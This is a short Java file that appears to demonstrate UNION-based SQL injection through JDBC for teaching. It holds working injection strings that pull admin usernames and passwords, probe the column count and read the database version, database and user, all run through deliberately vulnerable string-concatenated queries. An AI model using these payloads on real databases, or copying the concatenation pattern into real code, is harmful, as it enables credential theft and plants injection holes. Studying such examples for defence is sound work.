// UNION-Based SQL Injection via JDBC
// Attacker extends the original query with UNION to return data from other tables.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class union_based_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: id is concatenated, UNION appends attacker-controlled rows
        String id = "1 UNION SELECT username, password, NULL FROM admins";
        String query = "SELECT id, name, email FROM users WHERE id = " + id;

        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("Result: " + rs.getString(1) + " | " + rs.getString(2));
        }

        // Column count discovery with NULL placeholders
        String probe = "1 UNION SELECT NULL, NULL, NULL";
        ResultSet prs = st.executeQuery("SELECT id, name, email FROM users WHERE id = " + probe);
        System.out.println(prs.next() ? "Column count matches (3 columns)" : "Column mismatch");

        // Data exfiltration: DB version and current database
        String exfil = "1 UNION SELECT version(), database(), user()";
        ResultSet ers = st.executeQuery("SELECT id, name, email FROM users WHERE id = " + exfil);
        while (ers.next()) {
            System.out.println("DB version: " + ers.getString(2));
        }

        rs.close();
        prs.close();
        ers.close();
        st.close();
        con.close();
    }
}
